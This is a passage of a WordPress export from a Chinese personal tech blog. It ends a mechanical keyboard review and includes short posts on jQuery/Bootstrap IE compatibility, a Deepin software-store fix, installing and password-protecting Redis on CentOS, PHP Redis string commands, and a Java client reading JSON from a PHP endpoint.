驱动自带多种灯光配置：静止、彩虹音浪、焦点模式、单色、<strong>自定义(按P1、P2、P3、P4切换)</strong>、星空效果、午后阵雨、色彩循环、呼吸、涟漪、分区、贪吃蛇、系统状态(音谱模式、CPU使用率)以及关灯状态。
个人最喜欢的还是系统模式(另一个贪吃蛇目前貌似还玩不了)，而且官方还提供了SDK让有能力的玩家进行开发，可玩度大大提高(不过需要一定门槛<img class="face" src="https://www.nervgeek.com/wp-content/uploads/2016/03/6c8349cc7260ae62e3b1396831a8398f.png" alt="" />)。
<strong>我设置了三个自定义模式：</strong>
DotA2键位：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/f6dd443f218491aea05a2ebad868c4f8.jpg" alt="" />
写代码的键位：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/8baebe0187967af6e077bd0054e92773.jpg" alt="" />
打字的键位：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/f75ce8b39eaa110f25711dd1ae4c1bb9.jpg" alt="" />
设置好按下应用，配置就会写入键盘内，<strong>按下P1、P2、P3随时切换到我的自定义配置</strong>。
最后还有个管理库界面：
<img class="aligncenter" title="" src="https://www.nervgeek.com/wp-content/uploads/2016/03/1e66475bbf447cdfdd0c77d1a94e305a.jpg" alt="" />
驱动软件设置大致如上。
总结：
京东、淘宝大部分价格在899~999之间，京东之前貌似还能779低价买到，性价比高。使用了樱桃RGB轴，灯光绚丽，亮度适中。键线分离设计，便于走线。驱动易用，不难上手。个人不满：键帽内部太脏，配件较少(只有钢丝拔键器)，不配送防尘罩。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1122</wp:post_id>
		<wp:post_date><![CDATA[2016-03-26 21:21:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-03-26 13:21:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e9%85%b7%e5%86%b7%e8%87%b3%e5%b0%8a-masterkeys-pro-l-%e8%8c%b6%e8%bd%b4]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="mk-pro-l"><![CDATA[MK PRO L]]></category>
		<category domain="post_tag" nicename="rgb"><![CDATA[RGB]]></category>
		<category domain="category" nicename="showtime"><![CDATA[ShowTime]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%9c%ba%e6%a2%b0%e9%94%ae%e7%9b%98"><![CDATA[机械键盘]]></category>
		<category domain="post_tag" nicename="%e8%8c%b6%e8%bd%b4"><![CDATA[茶轴]]></category>
		<category domain="post_tag" nicename="%e9%85%b7%e5%86%b7%e8%87%b3%e5%b0%8a"><![CDATA[酷冷至尊]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1124]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[602]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>JQuery、Bootstrap 3.0 以及JQuery.form.js兼容性以及解决办法</title>
		<link>https://www.nervgeek.com/2016/04/15/jquery%e3%80%81bootstrap-3-0-%e4%bb%a5%e5%8f%8ajquery-form-js%e5%85%bc%e5%ae%b9%e6%80%a7%e4%bb%a5%e5%8f%8a%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95/</link>
		<pubDate>Fri, 15 Apr 2016 09:43:32 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1163</guid>
		<description></description>
		<content:encoded><![CDATA[随着网页的设计越来越美丽，很多人都发现老旧的IE 6、7、8都无法呈现出最好的画面，甚至无法使用部分功能从而使用Chrome之类的浏览器。但这个世界上还是有人用着老旧的IE来遨游互联网，所以我们开发一个网页的时候，还需要考虑到兼容性这个问题。我在开发一个网站的时候也遇到不少兼容性的问题，主要出现在JQuery、Bootstrap 3.0 以及JQuery.form.js。<!--more-->
JQuery：
JQuery 2.0开始，再也不支持IE 6\7\8 ，但我们依旧可以使用JQuery 1.9，在功能特性上，1.9和2.0基本一致。
Bootstrap 3.0：
Bootstrap 是twitter开源的一套样式框架，具有美观、开发便捷、功能齐全等优点，是快速开发的重要工具之一。从 Bootstrap 3.0 开始就只支持IE 8 以上的浏览器，在IE8浏览的时候还不能呈现最好的画面，为了解决 Bootstrap 3.0 在IE 8进一步的实现，我们可以使用<code>&lt;meta http-equiv='X-UA-Compatible' content='IE=edge,Chrome=1' /&gt;</code>，Chrome=1即表示如果客户机安装了Chrome的话，将使用Chrome来渲染画面。
JQuery.form.js：
JQuery.form.js是一个增强版的Ajax提交插件，可以完成文件上传等功能，而且使用也是非常的方便，但在IE9以下的版本，会出现不上传文件，返回码就不是200，所以无法执行到success，所以我使用了<code>if(file == "" || file == undefined || file == null){}</code>来判断是否有文件需要上传，如何没有，就调用JQuery自带的Ajax来提交。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1163</wp:post_id>
		<wp:post_date><![CDATA[2016-04-15 17:43:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-15 09:43:32]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[jquery%e3%80%81bootstrap-3-0-%e4%bb%a5%e5%8f%8ajquery-form-js%e5%85%bc%e5%ae%b9%e6%80%a7%e4%bb%a5%e5%8f%8a%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="bootstrap-3-0"><![CDATA[Bootstrap 3.0]]></category>
		<category domain="post_tag" nicename="jquery"><![CDATA[JQuery]]></category>
		<category domain="post_tag" nicename="jquery-form-js"><![CDATA[JQuery.form.js]]></category>
		<category domain="post_tag" nicename="%e5%85%bc%e5%ae%b9%e6%80%a7"><![CDATA[兼容性]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[179]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>解决Deepin 15.1.1 深度商店下载软件一直显示等待下载</title>
		<link>https://www.nervgeek.com/2016/04/16/%e8%a7%a3%e5%86%b3deepin-15-1-1-%e6%b7%b1%e5%ba%a6%e5%95%86%e5%ba%97%e4%b8%8b%e8%bd%bd%e8%bd%af%e4%bb%b6%e4%b8%80%e7%9b%b4%e6%98%be%e7%a4%ba%e7%ad%89%e5%be%85%e4%b8%8b%e8%bd%bd/</link>
		<pubDate>Sat, 16 Apr 2016 14:50:47 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1166</guid>
		<description></description>
		<content:encoded><![CDATA[最近给老旧的笔记本换上Linux系统成为主力系统，要求是简便容易上手还能玩DotA2的，国内的Deepin就是非常不错的选择。
不仅界面简洁好看，而且还有自带的商店。但就是这个商店，在下载软件的时候，一直无法下载，只显示"等待下载"四个字。
去社区溜达了一晚上，发现原来是系统在检测更新的时候，无法在深度商店下载软件，我们需要删除一个东西来解决这个问题。
<code>sudo rm /var/lib/apt/lists/lock</code>
删除之后应该就能正常下载了，如果还是无法解决，那就尝试重启一下电脑。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1166</wp:post_id>
		<wp:post_date><![CDATA[2016-04-16 22:50:47]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-16 14:50:47]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%a7%a3%e5%86%b3deepin-15-1-1-%e6%b7%b1%e5%ba%a6%e5%95%86%e5%ba%97%e4%b8%8b%e8%bd%bd%e8%bd%af%e4%bb%b6%e4%b8%80%e7%9b%b4%e6%98%be%e7%a4%ba%e7%ad%89%e5%be%85%e4%b8%8b%e8%bd%bd]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="deepin"><![CDATA[deepin]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e6%b7%b1%e5%ba%a6%e5%95%86%e5%ba%97"><![CDATA[深度商店]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[356]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>CentOS 6.7 安装配置Redis</title>
		<link>https://www.nervgeek.com/2016/04/17/centos-6-7-%e5%ae%89%e8%a3%85%e9%85%8d%e7%bd%aeredis/</link>
		<pubDate>Sun, 17 Apr 2016 11:51:37 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1174</guid>
		<description></description>
		<content:encoded><![CDATA[Redis是一种可持久化、开源、支持网络、基于内存的key-value存储系统，有点类似memcached，性能极高，支持超过100K+ 每秒的读写频率，一些大型的网站例如ITeye(JavaEye)和CSDN现在都用到了Redis。
假如使用一键LNMP的朋友，您可以参照<a href="http://lnmp.org/faq/addons.html">http://lnmp.org/faq/addons.html</a>来安装配置Redis，方便快捷。
假如是自己搭建的服务器，也可以非常快捷方便的安装Redis！<!--more-->
一：执行<code>wget http://download.redis.io/releases/redis-3.0.3.tar.gz</code>，下载Redis。
二：执行<code>tar zxvf redis-3.0.3.tar.gz</code>解压。
三：检查系统是否安装gcc编译器，可以执行<code>sudo yum -y intall gcc</code>。
四：进入Redis文件夹 <code>cd redis-3.0.3</code>，执行 <code>make</code> 命令编译Redis。
五：输入在当前目录执行(redis-3.0.3)./src/redis-server，即可运行redis服务。
可以进入./src/redis-cli，打开客户端进行测试！
<a href="https://www.nervgeek.com/wp-content/uploads/2016/04/0NMW0D_FX1B5HGGMSM.png" rel="attachment wp-att-1175"><img class="alignnone size-full wp-image-1175" src="https://www.nervgeek.com/wp-content/uploads/2016/04/0NMW0D_FX1B5HGGMSM.png" alt="[0NMW0D%_F~X[1B5HG$GMSM" width="1107" height="690" /></a>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1174</wp:post_id>
		<wp:post_date><![CDATA[2016-04-17 19:51:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-17 11:51:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[centos-6-7-%e5%ae%89%e8%a3%85%e9%85%8d%e7%bd%aeredis]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="centos"><![CDATA[CentOS]]></category>
		<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="redis"><![CDATA[Redis]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%ab%99%e5%bb%ba%e8%ae%be"><![CDATA[网站建设]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[276]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>CentOS 6.7 minimal搭建配置一键LNMP的Redis</title>
		<link>https://www.nervgeek.com/2016/04/18/centos-6-7-minimal%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%e4%b8%80%e9%94%aelnmp%e7%9a%84redis/</link>
		<pubDate>Mon, 18 Apr 2016 04:24:15 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1179</guid>
		<description></description>
		<content:encoded><![CDATA[一键LNMP自带非常多扩展，其中肯定有Redis，安装方法非常简单，进lnmp解压出来的文件夹(<strong>我在/root下载安装lnmp1.2，文件夹就是/root/lnmp1.2-full</strong>)下执行<code>./addons.sh install redis</code>，我安装的是redis-3.0.1版本。
安装好redis启动文件在/root/lnmp1.2-full/src/redis-3.0.1/src，redis配置文件在/root/lnmp1.2-full/src/redis-3.0.1/redis.conf。
如果需要修改密码，在redis.conf中找到# requirepass foobared，把#号删除掉，把你需要修改的密码替换掉foobared。
然后执行service redis stop停止掉redis，然后进lnmp1.2-full/src/redis-3.0.1/src，执行./redis-server /root/lnmp1.2-full/src/redis-3.0.1/redis.conf，这命令表示把配置加载启动。
设置密码之后，操作redis会提示错误：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/04/4MRW1TEMDYUHYPRO@SO2.png" rel="attachment wp-att-1180"><img class="alignnone size-full wp-image-1180" src="https://www.nervgeek.com/wp-content/uploads/2016/04/4MRW1TEMDYUHYPRO@SO2.png" alt="4(MRW%1TEMDYUHYPRO@}SO2" width="402" height="175" /></a>
使用auth命令输入密码即可：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/04/LA7FSU3ZN@7IEK@P6.png" rel="attachment wp-att-1181"><img class="alignnone size-full wp-image-1181" src="https://www.nervgeek.com/wp-content/uploads/2016/04/LA7FSU3ZN@7IEK@P6.png" alt="LA7FSU)3$ZN@7IE}K[@{P}6" width="398" height="170" /></a>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1179</wp:post_id>
		<wp:post_date><![CDATA[2016-04-18 12:24:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-18 04:24:15]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[centos-6-7-minimal%e6%90%ad%e5%bb%ba%e9%85%8d%e7%bd%ae%e4%b8%80%e9%94%aelnmp%e7%9a%84redis]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="myphoto"><![CDATA[个人摄影]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[305]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Redis之php操作——String</title>
		<link>https://www.nervgeek.com/2016/04/18/redis%e4%b9%8bphp%e6%93%8d%e4%bd%9c-string/</link>
		<pubDate>Mon, 18 Apr 2016 14:07:02 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1185</guid>
		<description></description>
		<content:encoded><![CDATA[使用PHP对Redis进行操作：    

<pre>
<?php
    //连接本地的 Redis 服务
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    //验证密码
    $redis->auth("asdasd");
    /**String操作*/
    //set方法，设置一个key和value
    $redis->set("Set", "Redis!");
    //get方法，根据key获取value
    echo $redis->get("Set");//输出Redis!
    echo "<br/>";
    //delete方法，根据key删除value
    $redis->delete("Set");
    echo "delete之后：".$redis->get("Set");//无输出
    echo "<br/>";
    //setnx方法，如果key不存在，则添加。
    $redis->setnx("Name","Mr9esx");
    echo $redis->get("Name");//输出Mr9esx
    echo "<br/>";
    $redis->setnx("Name","NervGeek");
    echo $redis->get("Name");//输出还是Mr9esx
    echo "<br/>";
    //exists方法，验证该Key是否存在
    var_dump($redis->exists("Name"));//输出bool(true)
    echo "<br/>";
    var_dump($redis->exists("Sex"));//输出bool(false)
    echo "<br/>";
    //incr方法，自增value是int的值
    $redis->set("Num","110");
    $redis->incr("Num");
    echo $redis->get("Num");//输出111
    echo "<br/>";
    $redis->incr("Num");
    echo $redis->get("Num");//输出112
    echo "<br/>";
    //incrBy方法，可以指定自增数
    $redis->incrBy("Num",50);
    echo $redis->get("Num");//输出162
    echo "<br/>";
    //decr方法，和incr相反，自减value是int的值
    $redis->decr("Num");
    echo $redis->get("Num");//输出161
    echo "<br/>";
    $redis->decr("Num");
    echo $redis->get("Num");//输出160
    echo "<br/>";
    //decrBy方法，可以指定自减数
    $redis->decrBy("Num",50);
    echo $redis->get("Num");//输出110
    echo "<br/>";
    //getMultiple方法，获取多个Key的值，返回一个数组，如果其中一个或者多个Key不存在，则返回false
    $redis->set("Key_1","k1");
    $redis->set("Key_2","k2");
    $redis->set("Key_3","k3");
    $result = $redis->getMultiple(["Key_1","Key_2","Key_3"]);
    print_r($result);//输出Array ( [0] => k1 [1] => k2 [2] => k3 )
    echo "<br/>";
    $result = $redis->getMultiple(["Key_1","Key_2","Key_0"]);
    var_dump($result);//输出array(3) { [0]=> string(2) "k1" [1]=> string(2) "k2" [2]=> bool(false) }
    echo "<br/>";
?>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1185</wp:post_id>
		<wp:post_date><![CDATA[2016-04-18 22:07:02]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-18 14:07:02]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[redis%e4%b9%8bphp%e6%93%8d%e4%bd%9c-string]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[php]]></category>
		<category domain="category" nicename="redis"><![CDATA[Redis]]></category>
		<category domain="post_tag" nicename="redis"><![CDATA[Redis]]></category>
		<category domain="post_tag" nicename="%e6%89%8b%e5%86%8c"><![CDATA[手册]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[266]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java通过Http(URL)获取PHP后台发出的JSON</title>
		<link>https://www.nervgeek.com/2016/04/23/java%e9%80%9a%e8%bf%87httpurl%e8%8e%b7%e5%8f%96php%e5%90%8e%e5%8f%b0%e5%8f%91%e5%87%ba%e7%9a%84json/</link>
		<pubDate>Sat, 23 Apr 2016 11:00:55 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1196</guid>
		<description></description>
		<content:encoded><![CDATA[最近做的匿名版，网页部分已经没什么大问题了，该优化的也优化了，该实现的功能也基本实现了，所以考虑开始制作一个安卓APP，首先需要做的是PHP有一个返回JSON的功能，然后安卓通过JAVA来获取到JSON数据，继而渲染出界面。
首先是PHP服务端：

<pre><?php
    if(isset($_GET['page'])){
        require_once ('../config.php');
        require_once ('./medoo.php');
        /* 连接数据库*/
        function connMySQL(){
            return $database = new medoo(array(
                'database_type' => 'mysql', //连接类型：mysql、mssql、sybase
                'database_name' => DATABASENAME, //数据库名
                'charset' => 'utf8',
                'server' => DATABASESRC, //数据库地址
                'username' => DATABASEUSER, //数据库账号
                'password' => DATABASEPASS, //数据库密码
            ));
        }
        $database = connMySQL();
        $array = $database->select("nmb_page","*");
        header('Content-type: application/json');
        echo json_encode($array);
    }
?></pre>

然后是Java客户端：

<pre>import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
public class Main {
public static void main(String[] args) {
    System.out.println("Hello World!");
        StringBuilder json = new StringBuilder();
        try {
            URL urlObject = new URL("http://127.0.0.1/reNMB/Module/jsonrpc.php?block=综合版&amp;page=2");
            URLConnection uc = urlObject.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(uc.getInputStream()));
            String inputLine = null;
            while ( (inputLine = in.readLine()) != null) {
                json.append(inputLine);
            }
            in.close();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        String jsonArr = json.toString();
        JSONArray obj = JSONArray.fromObject(jsonArr);
        for (int i = 0; i < obj.size(); i++) {
        System.out.println("Array:" + obj.getString(i) + " ");
        }
    }
    public static String convert(String utfString){
        StringBuilder sb = new StringBuilder();
        int i = -1;
        int pos = 0;
        while((i=utfString.indexOf("\\u", pos)) != -1){
            sb.append(utfString.substring(pos, i));
            if(i+5 < utfString.length()){
                pos = i+6;
                sb.append((char)Integer.parseInt(utfString.substring(i+2, i+6), 16));
            }
        }
        return sb.toString();
    }
}</pre>

一般php返回来的JSON数据中文都变成unicode编码，所以我们需要使用convert方法把unicode编号转换成中文。、
运行java程序，成功返回数据！

<pre>Hello World!
Array:{"id":"1","page_title":"无标题","page_name":"无名氏","page_email":null,"page_send_time":"2016-03-24 07:51:37","page_change_time":"2016-03-24 07:51:37","page_send_cookie":"MGgD7bByQ","img_url":"","is_sega":"0","page_text":"第一次发帖测试","reply_conut":null,"block":"综合版"}
Array:{"id":"2","page_title":"无标题","page_name":"无名氏","page_email":null,"page_send_time":"2016-03-26 14:57:48","page_change_time":"2016-03-26 14:57:48","page_send_cookie":"","img_url":"","is_sega":"0","page_text":"21312313123","reply_conut":null,"block":"综合版"}</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1196</wp:post_id>
		<wp:post_date><![CDATA[2016-04-23 19:00:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-04-23 11:00:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e9%80%9a%e8%bf%87httpurl%e8%8e%b7%e5%8f%96php%e5%90%8e%e5%8f%b0%e5%8f%91%e5%87%ba%e7%9a%84json]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="http"><![CDATA[http]]></category>
